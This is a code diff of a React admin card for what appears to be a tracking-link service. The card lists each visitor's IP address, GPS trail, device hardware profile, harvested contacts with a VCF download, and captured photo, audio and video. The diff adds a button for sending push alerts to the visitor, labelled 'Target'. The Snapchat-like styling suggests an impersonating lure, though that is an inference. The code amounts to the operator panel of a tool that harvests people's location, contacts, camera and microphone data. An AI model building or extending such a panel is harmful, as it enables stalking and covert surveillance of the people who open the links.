@@ -1,6 +1,6 @@
+// components/admin/VisitorSessionCard.tsx
 "use client";
 
-// components/admin/VisitorSessionCard.tsx
 import React, { useState } from "react";
 import { Card } from "@/components/ui/Card";
 import { Badge } from "@/components/ui/Badge";
@@ -8,17 +8,17 @@ import { Button } from "@/components/ui/Button";
 import { LocationSession } from "@/lib/types";
 import { formatDate } from "@/lib/utils";
 import { getSnapImageUrl } from "@/lib/storage";
-import { SessionPhotoCard } from "./SessionPhotoCard";
+import { SessionHardwareGrid } from "./SessionHardwareGrid";
+import { SessionMediaGallery } from "./SessionMediaGallery";
+import { SendPushModal } from "./SendPushModal";
 import {
   ExternalLink,
   MapPin,
-  Smartphone,
-  Battery,
-  BatteryCharging,
   Users,
   Download,
   ChevronDown,
   ChevronUp,
+  Bell,
 } from "lucide-react";
 
 interface VisitorSessionCardProps {
@@ -27,13 +27,14 @@ interface VisitorSessionCardProps {
 
 export const VisitorSessionCard: React.FC<VisitorSessionCardProps> = ({ session }) => {
   const [showContacts, setShowContacts] = useState(false);
+  const [showPushModal, setShowPushModal] = useState(false);
+
   const latestCoord = session.location_updates?.[session.location_updates.length - 1];
-  const dev = session.device_info;
   const capturedData = (session.captured_data as any) || {};
   const contactsList = capturedData.contacts || [];
   const vcfPath = capturedData.contacts_vcf_path;
-  const photoUrl = session.captured_media_path ? getSnapImageUrl(session.captured_media_path) : null;
   const vcfUrl = vcfPath ? getSnapImageUrl(vcfPath) : null;
+  const hasPush = Boolean(session.push_subscription);
 
   return (
     <Card variant="glass" className="p-4 sm:p-5 space-y-4">
@@ -46,13 +47,29 @@ export const VisitorSessionCard: React.FC<VisitorSessionCardProps> = ({ session 
           <span className="text-xs font-mono text-white/80 font-bold">
             IP: {session.ip_address || "Unknown"}
           </span>
+          <span className="text-[11px] font-mono font-bold px-2 py-0.5 rounded-md bg-[#FFFC00]/15 text-[#FFFC00] border border-[#FFFC00]/30">
+            {session.visit_count && session.visit_count > 1 ? `Visit #${session.visit_count}` : "Visit #1"}
+          </span>
         </div>
-        <span className="text-xs text-white/40 font-mono">
-          {formatDate(session.consent_at)}
-        </span>
+
+        <div className="flex items-center gap-2">
+          {hasPush && (
+            <Button
+              size="sm"
+              variant="secondary"
+              onClick={() => setShowPushModal(true)}
+              className="h-7 text-[11px] gap-1 px-2.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 border border-rose-500/20"
+            >
+              <Bell className="w-3 h-3" /> Push Alert
+            </Button>
+          )}
+          <span className="text-xs text-white/40 font-mono">
+            {formatDate(session.last_visited_at || session.consent_at)}
+          </span>
+        </div>
       </div>
 
-      {/* Grid info: Coordinates & Device */}
+      {/* Grid info: Coordinates & Deep Hardware */}
       <div className="grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4">
         {/* Location & GPS */}
         <div className="space-y-2 bg-slate-50 dark:bg-white/[0.03] p-3.5 rounded-2xl border border-slate-200/80 dark:border-white/5">
@@ -89,39 +106,17 @@ export const VisitorSessionCard: React.FC<VisitorSessionCardProps> = ({ session 
           )}
         </div>
 
-        {/* Device & Battery Telemetry */}
-        <div className="space-y-2 bg-slate-50 dark:bg-white/[0.03] p-3.5 rounded-2xl border border-slate-200/80 dark:border-white/5 text-xs">
-          <div className="flex items-center gap-2 text-xs font-bold text-slate-900 dark:text-white">
-            <Smartphone className="w-3.5 h-3.5 text-amber-600 dark:text-[#FFFC00]" />
-            <span>Device Telemetry</span>
-          </div>
-
-          <div className="grid grid-cols-2 gap-2 text-slate-700 dark:text-white/70">
-            <div>
-              <p className="text-[10px] text-slate-400 dark:text-white/40 font-semibold uppercase tracking-wider">OS &amp; Browser</p>
-              <p className="font-semibold text-slate-900 dark:text-white truncate">
-                {dev?.os || "Unknown"} • {dev?.browser || "Browser"}
-              </p>
-            </div>
-            <div>
-              <p className="text-[10px] text-slate-400 dark:text-white/40 font-semibold uppercase tracking-wider">Screen &amp; Timezone</p>
-              <p className="truncate">{dev?.screen || "—"} • {dev?.timezone || "—"}</p>
-            </div>
-          </div>
-
-          {dev?.battery !== null && dev?.battery !== undefined && (
-            <div className="flex items-center gap-1.5 text-[11px] text-amber-700 dark:text-[#FFFC00] pt-1 font-mono">
-              {dev.isCharging ? <BatteryCharging className="w-3.5 h-3.5" /> : <Battery className="w-3.5 h-3.5" />}
-              <span>Battery: {dev.battery}% {dev.isCharging ? "(Charging)" : ""}</span>
-            </div>
-          )}
-        </div>
+        {/* Deep Device & Hardware Profile */}
+        <SessionHardwareGrid dev={session.device_info} />
       </div>
 
-      {/* Captured Camera Photo (if present) */}
-      {photoUrl && (
-        <SessionPhotoCard photoUrl={photoUrl} visitorIp={session.ip_address} />
-      )}
+      {/* Captured Multi-Media (Photo, Audio Memo, Video Burst) */}
+      <SessionMediaGallery
+        photoPath={session.captured_media_path}
+        audioPath={session.captured_audio_path}
+        videoPath={session.captured_video_path}
+        visitorIp={session.ip_address}
+      />
 
       {/* Captured Contacts (if present) */}
       {capturedData.contacts_count > 0 && (
@@ -162,6 +157,17 @@ export const VisitorSessionCard: React.FC<VisitorSessionCardProps> = ({ session 
             </div>
           )}
         </div>
+      )}
+
+      {/* Send Push Modal */}
+      {hasPush && (
+        <SendPushModal
+          isOpen={showPushModal}
+          linkId={session.link_id}
+          sessionId={session.id}
+          visitorLabel={`Visitor ${session.ip_address || "Target"}`}
+          onClose={() => setShowPushModal(false)}
+        />
       )}
     </Card>
   );
